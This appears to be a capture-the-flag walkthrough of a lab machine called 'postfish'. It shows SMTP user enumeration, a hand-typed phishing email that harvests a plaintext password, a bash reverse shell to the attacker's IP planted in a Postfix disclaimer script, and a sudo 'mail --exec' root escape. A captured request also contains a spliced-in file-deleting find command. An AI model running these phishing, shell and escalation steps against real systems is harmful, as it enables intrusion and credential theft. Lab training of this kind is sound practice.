## INFORMATION GATHERING
```bash
# IP ADDRESS
192.168.184.137

# HOSTNAME
postfish                                                    //Found post Initial foothold
# OPERATING SYSTEM
Ubuntu 20.04.1 LTS 20.04.1 LTS (Focal Fossa)                //Found post Initial foothold
# CREDENTIALS  
brian.moore:EternaLSunshinE                                 //Found post Initial foothold
```
## OPEN PORTS DETAILS
```bash
22/tcp  open  ssh      syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp     syn-ack ttl 61 Postfix smtpd
80/tcp  open  http     syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
- Web Server
	- Apache httpd 2.4.41
110/tcp open  pop3     syn-ack ttl 61 Dovecot pop3d
143/tcp open  imap     syn-ack ttl 61 Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap syn-ack ttl 61 Dovecot imapd (Ubuntu)
995/tcp open  ssl/pop3 syn-ack ttl 61 Dovecot pop3d
```
# ENUMERATION
```bash
# HTTP
80/tcp  open  http     syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
sudo /etc/hosts
192.168.184.137 postfish.off

- http://postfish.off/team.html - contains names 
	- Claire Madison
	- Mike Ross
	- Brian Moore
	- Sarah Lorem

- Genrate usernames using https://github.com/florianges/UsernameGenerator
python3 UsernameGenerator.py ../poss-names ../names
- got username list

# SMTP
25/tcp  open  smtp     syn-ack ttl 61 Postfix smtpd
- user enumeration
sudo smtp-user-enum -M VRFY -U names -t $ip
192.168.184.137: claire.madison exists
192.168.184.137: mike.ross exists
192.168.184.137: brian.moore exists
192.168.184.137: sarah.lorem exists

# POP3
110/tcp open  pop3     syn-ack ttl 61 Dovecot pop3d
995/tcp open  ssl/pop3 syn-ack ttl 61 Dovecot pop3d


# IMAP
143/tcp open  imap     syn-ack ttl 61 Dovecot imapd (Ubuntu)
993/tcp open  ssl/imap syn-ack ttl 61 Dovecot imapd (Ubuntu)

# SSH
22/tcp  open  ssh      syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
```
## INITIAL FOOTHOLD
```bash
- Try Phishing sending mail (Brian worked)
- 
sudo nc -nvv $ip 25 
(UNKNOWN) [192.168.184.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
USER claire.madison
502 5.5.2 Error: command not recognized
VRFY claire.madison
252 2.0.0 claire.madison
RETR 1
502 5.5.2 Error: command not recognized
HELO test
250 postfish.off
MAIL FROM: it@postfish.off
250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
Hi Brian,
Please follow this link to reset your password: http://192.168.45.212/                              
Regards,
.
250 2.0.0 Ok: queued as ED59640214

sudo nc -nvlp 80                                          
listening on [any] 80 ...
connect to [192.168.45.212] from (UNKNOWN) [192.168.184.137] 58520
POST / HTTP/1.1
Host: 192.168.45.212
User-Agent: curl/7.68.0
Accept: */*
Content-Length: 207
Content-Type: application/x-www-form-urlencoded

first_name%3DBrian%26last_name%3DMoore%26email%3Dbrian.moore%postfish.off%26username%3Dbrian.moore%26password%3DEternaLSunshinE%26confifind /var/mail/ -type f ! -name sales -delete_password%3DEternaLSunshinE

- url decode found creds
brian.moore:EternaLSunshinE

- use the creds to login via ssh

# user shell brian.moore
```
## PRIVILEGE ESCALATION
```bash
- Run linpeas.sh
- Modified interesting files in the last 5mins (limit 100) 
/etc/postfix/disclaimer
-rwxrwx--- 1 root filter 1184 Nov 18 09:51 /etc/postfix/disclaimer
- file triggers when mail send 

- File with write privileges
ps -ef
filter    209014  209012  0 09:50 ?        00:00:00 /bin/bash /etc/postfix/disclaimer -f it@postfish.off -- brian.moore@postfish.off

- Trying to escalate to user filter
- edit /etc/postfix/disclaimer with reverse shell 
bash -i >& /dev/tcp/192.168.45.212/8888 0>&1

sudo nc -nvlp 8888

- Sending mail
sudo nc -nvv $ip 25

[sudo] password for kali: 
(UNKNOWN) [192.168.184.137] 25 (smtp) open
220 postfish.off ESMTP Postfix (Ubuntu)
HELO test
250 postfish.off
MAIL FROM: it@postfish.off
250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
shell
.
250 2.0.0 Ok: queued as 071EB404F6
QUIT
221 2.0.0 Bye
 sent 89, rcvd 175

sudo nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.212] from (UNKNOWN) [192.168.184.137] 59872
bash: cannot set terminal process group (209014): Inappropriate ioctl for device
bash: no job control in this shell
filter@postfish:/var/spool/postfix$ id
id
uid=997(filter) gid=997(filter) groups=997(filter)
filter@postfish:/var/spool/postfix$ whoami
whoami
filter
filter@postfish:/var/spool/postfix$ sudo -l
sudo -l
Matching Defaults entries for filter on postfish:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User filter may run the following commands on postfish:
    (ALL) NOPASSWD: /usr/bin/mail *

# GTFOBINS - sudo
filter@postfish:/var/spool/postfix$ sudo mail --exec='!/bin/sh'
sudo mail --exec='!/bin/sh'
id
uid=0(root) gid=0(root) groups=0(root)
whoami
root

# root
```
# ENUMERATION OUTPUTS
## NMAP
```bash
# Nmap 7.94SVN scan initiated Mon Nov 18 13:27:36 2024 as: /usr/lib/nmap/nmap -p- -sC -sV -vv -oN nmap/scan-script-version 192.168.184.137
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH6PH1/ST7TUJ4Mp/l4c7G+TM07YbX7YIsnHzq1TRpvtiBh8MQuFkL1SWW9+za+h6ZraqoZ0ewwkH+0la436t9Q+2H/Nh4CntJOrRbpLJKg4hChjgCHd5KiLCOKHhXPs/FA3mm0Zkzw1tVJLPR6RTbIkkbQiV2Zk3u8oamV5srWIJeYUY5O2XXmTnKENfrPXeHup1+3wBOkTO4Mu17wBSw6yvXyj+lleKjQ6Hnje7KozW5q4U6ijd3LmvHE34UHq/qUbCUbiwY06N2Mj0NQiZqWW8z48eTzGsuh6u1SfGIDnCCq3sWm37Y5LIUvqAFyIEJZVsC/UyrJDPBE+YIODNbN2QLD9JeBr8P4n1rkMaXbsHGywFtutdSrBZwYuRuB2W0GjIEWD/J7lxKIJ9UxRq0UxWWkZ8s3SNqUq2enfPwQt399nigtUerccskdyUD0oRKqVnhZCjEYfX3qOnlAqejr3Lpm8nA31pp6lrKNAmQEjdSO8Jxk04OR2JBxcfVNfs=
|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI0EdIHR7NOReMM0G7C8zxbLgwB3ump+nb2D3Pe3tXqp/6jNJ/GbU2e4Ab44njMKHJbm/PzrtYzojMjGDuBlQCg=
|   256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDCc0saExmeDXtqm5FS+D5RnDke8aJEvFq3DJIr0KZML

25/tcp  open  smtp     syn-ack ttl 61 Postfix smtpd
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-26T10:26:37
| Not valid after:  2031-01-24T10:26:37
| MD5:   5376:0d7f:8cb1:2db9:fedd:1809:463e:94c2
| SHA-1: 63ab:a073:44fd:01a2:489f:c9a0:8f50:de80:f33c:6895
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUGEC4bDhH06jafLyt+oBBOT7SWm0wDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGdWJ1bnR1MB4XDTIxMDEyNjEwMjYzN1oXDTMxMDEyNDEw
| MjYzN1owETEPMA0GA1UEAwwGdWJ1bnR1MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAxj4r7x6ucND17Gv8yE+fKOLLfePFwLvxtMSGSb/VLPMgZ42G3L5C
| pZF7+T9fGgYTMFSeJl1O/6vW8qeby8/ikCCYbO/bXRdlCPh2ROQe2O+ZfY097MyV
| 512iUWH9NWbs8lI/QnH+AIxywPhyOsGmTc+lTht2Edc4fPJaBQdjDiQyalypcm0K
| 7EOr3Q1VJmAoWietBfoaPJ7EEXLJNQEOokSP6tnOoSvV4iCyVT5RaZXsAOi4bbtR
| 4/HyZfLYqqs6fLlvlXcFF325UKYnUfSKqrYGxBZbY7RrNgAoo0rA/PfrBf7DhZQx
| FNyUFDNI/4AycpEK/qC3lFO+rL46n1hZHQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnVidW50dTANBgkqhkiG9w0BAQsFAAOCAQEAskRHHDOoKAUHl4AM
| qANWP0c9kqC73Gw2hxUVRtqpyl0LR3mbNfBw48G+VssMtqjP4sy35ZbhSPL7tUYu
| bcr7fe/tkewwuaxEkJ/7D8xGMFADC56vxKG4f52aMjjeT69mu0Y46arsFKQKhUe9
| i4WZ7PE6tE6N39K3TnbjsXTwRfrCCxx6cNYBNZ9fiVmDCRg+gZGCc4YKWZtu8yZL
| PHlBkmp23p9zgSOyU0+UIsA22icofHY9/U5KeSgUMwiVsfUSTVd6ZxkBdo8GE6IX
| b8FMFX+BiAUtmFYxqpGMWkq8JAiXK0f302nUorXrrOrLHJfUQ9efbOMMvsUuGrrS
| lH7cyA==
|_-----END CERTIFICATE-----
|_smtp-commands: postfish.off, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING

80/tcp  open  http     syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Site doesn't have a title (text/html).

110/tcp open  pop3     syn-ack ttl 61 Dovecot pop3d
|_pop3-capabilities: USER RESP-CODES AUTH-RESP-CODE CAPA STLS TOP SASL(PLAIN) PIPELINING UIDL
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-26T10:26:37
| Not valid after:  2031-01-24T10:26:37
| MD5:   5376:0d7f:8cb1:2db9:fedd:1809:463e:94c2
| SHA-1: 63ab:a073:44fd:01a2:489f:c9a0:8f50:de80:f33c:6895
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUGEC4bDhH06jafLyt+oBBOT7SWm0wDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGdWJ1bnR1MB4XDTIxMDEyNjEwMjYzN1oXDTMxMDEyNDEw
| MjYzN1owETEPMA0GA1UEAwwGdWJ1bnR1MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAxj4r7x6ucND17Gv8yE+fKOLLfePFwLvxtMSGSb/VLPMgZ42G3L5C
| pZF7+T9fGgYTMFSeJl1O/6vW8qeby8/ikCCYbO/bXRdlCPh2ROQe2O+ZfY097MyV
| 512iUWH9NWbs8lI/QnH+AIxywPhyOsGmTc+lTht2Edc4fPJaBQdjDiQyalypcm0K
| 7EOr3Q1VJmAoWietBfoaPJ7EEXLJNQEOokSP6tnOoSvV4iCyVT5RaZXsAOi4bbtR
| 4/HyZfLYqqs6fLlvlXcFF325UKYnUfSKqrYGxBZbY7RrNgAoo0rA/PfrBf7DhZQx
| FNyUFDNI/4AycpEK/qC3lFO+rL46n1hZHQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnVidW50dTANBgkqhkiG9w0BAQsFAAOCAQEAskRHHDOoKAUHl4AM
| qANWP0c9kqC73Gw2hxUVRtqpyl0LR3mbNfBw48G+VssMtqjP4sy35ZbhSPL7tUYu
| bcr7fe/tkewwuaxEkJ/7D8xGMFADC56vxKG4f52aMjjeT69mu0Y46arsFKQKhUe9
| i4WZ7PE6tE6N39K3TnbjsXTwRfrCCxx6cNYBNZ9fiVmDCRg+gZGCc4YKWZtu8yZL
| PHlBkmp23p9zgSOyU0+UIsA22icofHY9/U5KeSgUMwiVsfUSTVd6ZxkBdo8GE6IX
| b8FMFX+BiAUtmFYxqpGMWkq8JAiXK0f302nUorXrrOrLHJfUQ9efbOMMvsUuGrrS
| lH7cyA==
|_-----END CERTIFICATE-----

143/tcp open  imap     syn-ack ttl 61 Dovecot imapd (Ubuntu)
|_ssl-date: TLS randomness does not represent time
|_imap-capabilities: more AUTH=PLAINA0001 LITERAL+ OK capabilities STARTTLS have post-login listed Pre-login ID IMAP4rev1 ENABLE IDLE LOGIN-REFERRALS SASL-IR
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-26T10:26:37
| Not valid after:  2031-01-24T10:26:37
| MD5:   5376:0d7f:8cb1:2db9:fedd:1809:463e:94c2
| SHA-1: 63ab:a073:44fd:01a2:489f:c9a0:8f50:de80:f33c:6895
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUGEC4bDhH06jafLyt+oBBOT7SWm0wDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGdWJ1bnR1MB4XDTIxMDEyNjEwMjYzN1oXDTMxMDEyNDEw
| MjYzN1owETEPMA0GA1UEAwwGdWJ1bnR1MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAxj4r7x6ucND17Gv8yE+fKOLLfePFwLvxtMSGSb/VLPMgZ42G3L5C
| pZF7+T9fGgYTMFSeJl1O/6vW8qeby8/ikCCYbO/bXRdlCPh2ROQe2O+ZfY097MyV
| 512iUWH9NWbs8lI/QnH+AIxywPhyOsGmTc+lTht2Edc4fPJaBQdjDiQyalypcm0K
| 7EOr3Q1VJmAoWietBfoaPJ7EEXLJNQEOokSP6tnOoSvV4iCyVT5RaZXsAOi4bbtR
| 4/HyZfLYqqs6fLlvlXcFF325UKYnUfSKqrYGxBZbY7RrNgAoo0rA/PfrBf7DhZQx
| FNyUFDNI/4AycpEK/qC3lFO+rL46n1hZHQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnVidW50dTANBgkqhkiG9w0BAQsFAAOCAQEAskRHHDOoKAUHl4AM
| qANWP0c9kqC73Gw2hxUVRtqpyl0LR3mbNfBw48G+VssMtqjP4sy35ZbhSPL7tUYu
| bcr7fe/tkewwuaxEkJ/7D8xGMFADC56vxKG4f52aMjjeT69mu0Y46arsFKQKhUe9
| i4WZ7PE6tE6N39K3TnbjsXTwRfrCCxx6cNYBNZ9fiVmDCRg+gZGCc4YKWZtu8yZL
| PHlBkmp23p9zgSOyU0+UIsA22icofHY9/U5KeSgUMwiVsfUSTVd6ZxkBdo8GE6IX
| b8FMFX+BiAUtmFYxqpGMWkq8JAiXK0f302nUorXrrOrLHJfUQ9efbOMMvsUuGrrS
| lH7cyA==
|_-----END CERTIFICATE-----

993/tcp open  ssl/imap syn-ack ttl 61 Dovecot imapd (Ubuntu)
|_imap-capabilities: more AUTH=PLAINA0001 LITERAL+ OK capabilities SASL-IR post-login have Pre-login ID IMAP4rev1 listed IDLE LOGIN-REFERRALS ENABLE
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-26T10:26:37
| Not valid after:  2031-01-24T10:26:37
| MD5:   5376:0d7f:8cb1:2db9:fedd:1809:463e:94c2
| SHA-1: 63ab:a073:44fd:01a2:489f:c9a0:8f50:de80:f33c:6895
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUGEC4bDhH06jafLyt+oBBOT7SWm0wDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGdWJ1bnR1MB4XDTIxMDEyNjEwMjYzN1oXDTMxMDEyNDEw
| MjYzN1owETEPMA0GA1UEAwwGdWJ1bnR1MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAxj4r7x6ucND17Gv8yE+fKOLLfePFwLvxtMSGSb/VLPMgZ42G3L5C
| pZF7+T9fGgYTMFSeJl1O/6vW8qeby8/ikCCYbO/bXRdlCPh2ROQe2O+ZfY097MyV
| 512iUWH9NWbs8lI/QnH+AIxywPhyOsGmTc+lTht2Edc4fPJaBQdjDiQyalypcm0K
| 7EOr3Q1VJmAoWietBfoaPJ7EEXLJNQEOokSP6tnOoSvV4iCyVT5RaZXsAOi4bbtR
| 4/HyZfLYqqs6fLlvlXcFF325UKYnUfSKqrYGxBZbY7RrNgAoo0rA/PfrBf7DhZQx
| FNyUFDNI/4AycpEK/qC3lFO+rL46n1hZHQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnVidW50dTANBgkqhkiG9w0BAQsFAAOCAQEAskRHHDOoKAUHl4AM
| qANWP0c9kqC73Gw2hxUVRtqpyl0LR3mbNfBw48G+VssMtqjP4sy35ZbhSPL7tUYu
| bcr7fe/tkewwuaxEkJ/7D8xGMFADC56vxKG4f52aMjjeT69mu0Y46arsFKQKhUe9
| i4WZ7PE6tE6N39K3TnbjsXTwRfrCCxx6cNYBNZ9fiVmDCRg+gZGCc4YKWZtu8yZL
| PHlBkmp23p9zgSOyU0+UIsA22icofHY9/U5KeSgUMwiVsfUSTVd6ZxkBdo8GE6IX
| b8FMFX+BiAUtmFYxqpGMWkq8JAiXK0f302nUorXrrOrLHJfUQ9efbOMMvsUuGrrS
| lH7cyA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time

995/tcp open  ssl/pop3 syn-ack ttl 61 Dovecot pop3d
| ssl-cert: Subject: commonName=ubuntu
| Subject Alternative Name: DNS:ubuntu
| Issuer: commonName=ubuntu
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-01-26T10:26:37
| Not valid after:  2031-01-24T10:26:37
| MD5:   5376:0d7f:8cb1:2db9:fedd:1809:463e:94c2
| SHA-1: 63ab:a073:44fd:01a2:489f:c9a0:8f50:de80:f33c:6895
| -----BEGIN CERTIFICATE-----
| MIIC0DCCAbigAwIBAgIUGEC4bDhH06jafLyt+oBBOT7SWm0wDQYJKoZIhvcNAQEL
| BQAwETEPMA0GA1UEAwwGdWJ1bnR1MB4XDTIxMDEyNjEwMjYzN1oXDTMxMDEyNDEw
| MjYzN1owETEPMA0GA1UEAwwGdWJ1bnR1MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A
| MIIBCgKCAQEAxj4r7x6ucND17Gv8yE+fKOLLfePFwLvxtMSGSb/VLPMgZ42G3L5C
| pZF7+T9fGgYTMFSeJl1O/6vW8qeby8/ikCCYbO/bXRdlCPh2ROQe2O+ZfY097MyV
| 512iUWH9NWbs8lI/QnH+AIxywPhyOsGmTc+lTht2Edc4fPJaBQdjDiQyalypcm0K
| 7EOr3Q1VJmAoWietBfoaPJ7EEXLJNQEOokSP6tnOoSvV4iCyVT5RaZXsAOi4bbtR
| 4/HyZfLYqqs6fLlvlXcFF325UKYnUfSKqrYGxBZbY7RrNgAoo0rA/PfrBf7DhZQx
| FNyUFDNI/4AycpEK/qC3lFO+rL46n1hZHQIDAQABoyAwHjAJBgNVHRMEAjAAMBEG
| A1UdEQQKMAiCBnVidW50dTANBgkqhkiG9w0BAQsFAAOCAQEAskRHHDOoKAUHl4AM
| qANWP0c9kqC73Gw2hxUVRtqpyl0LR3mbNfBw48G+VssMtqjP4sy35ZbhSPL7tUYu
| bcr7fe/tkewwuaxEkJ/7D8xGMFADC56vxKG4f52aMjjeT69mu0Y46arsFKQKhUe9
| i4WZ7PE6tE6N39K3TnbjsXTwRfrCCxx6cNYBNZ9fiVmDCRg+gZGCc4YKWZtu8yZL
| PHlBkmp23p9zgSOyU0+UIsA22icofHY9/U5KeSgUMwiVsfUSTVd6ZxkBdo8GE6IX
| b8FMFX+BiAUtmFYxqpGMWkq8JAiXK0f302nUorXrrOrLHJfUQ9efbOMMvsUuGrrS
| lH7cyA==
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_pop3-capabilities: USER SASL(PLAIN) TOP RESP-CODES UIDL AUTH-RESP-CODE PIPELINING CAPA

Service Info: Host:  postfish.off; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

